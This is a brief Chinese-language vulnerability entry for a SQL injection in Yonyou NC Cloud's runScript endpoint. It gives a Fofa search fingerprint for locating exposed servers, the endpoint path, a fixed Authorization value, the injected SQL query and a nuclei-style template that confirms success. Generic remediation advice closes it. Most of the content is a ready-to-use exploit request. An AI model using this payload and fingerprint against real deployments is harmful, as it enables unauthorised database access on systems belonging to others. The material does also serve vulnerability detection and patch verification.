# 用友-nc-cloudrunscriptsql注入

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="platform/pub/welcome.do"`
- **请求**：`POST /ncchr/attendScript/internal/runScript HTTP/1.1`

**请求体 / payload**
```
1. Fofa
body="platform/pub/welcome.do"
1. 部分界面如下
3、隐患url,复现如下
id: yongyou-nc-cloud-runScript-sqli
info:
name: yongyou-nc-cloud-runScript-sqli
author: m0be1
severity: high
http:
- raw:
-
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Authorization: 58e00466213416018d01d15de83b0198
key=1&script=select 1,111*111,USER,4,5,6,7,8,9,10 from dual
matchers:
- type: dsl
dsl:
- status_code==200 && contains_all(body,"12321")
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。